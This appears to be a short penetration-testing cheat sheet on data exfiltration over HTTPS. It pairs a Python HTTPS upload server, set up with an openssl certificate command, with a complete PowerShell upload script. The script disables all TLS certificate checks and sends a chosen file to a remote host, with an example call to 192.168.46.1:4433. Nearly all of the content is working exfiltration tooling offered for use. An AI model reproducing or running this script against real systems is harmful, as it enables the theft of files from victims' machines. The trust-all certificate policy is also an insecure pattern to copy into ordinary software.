# Exfiltration

## Exfiltration Over HTTP(S)
### The Server - Python

1. Download Python HTTPS Server with Authentication
	
	ADDLINK

2. Create certificate

Create a certificate so you can use SSL

```
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
```

3. Start the server

Usage:

```
python simple-https-server.py 4433 admin:password
```

### The Client - Powershell

1. Create upload.ps1

```
 add-type @"
 using System.Net;
 using System.Security.Cryptography.X509Certificates;
 public class TrustAllCertsPolicy : ICertificatePolicy {
 public bool CheckValidationResult(
 ServicePoint srvPoint, X509Certificate certificate,
 WebRequest request, int certificateProblem) {
 return true;
 }
 }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

echo "========================================================================"
echo "USAGE: ./upload.ps1 https://domain.com/ username:password file_to_upload"
echo "-"
echo "NOTE: script and file to be uploaded must be in the same directory"
echo "========================================================================"

$url=$args[0]
$auth=$args[1]
$filename=$args[2]

$encodedCreds = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($auth))

$WebClient = new-object System.Net.WebClient
$WebClient.Headers.Add("Authorization", "Basic " + $encodedCreds)
$WebClient.Headers.Add("X-Atlassian-Token", "nocheck")
$WebClient.UploadFile($url, (Get-Location).Path + "\" + $filename)
```


2. Upload files to server


`./upload.ps1 <https://ip:port/> <admin:password> <file (in current dir)>`

`./upload.ps1 https://192.168.46.1:4433/ admin:password file_to_upload`


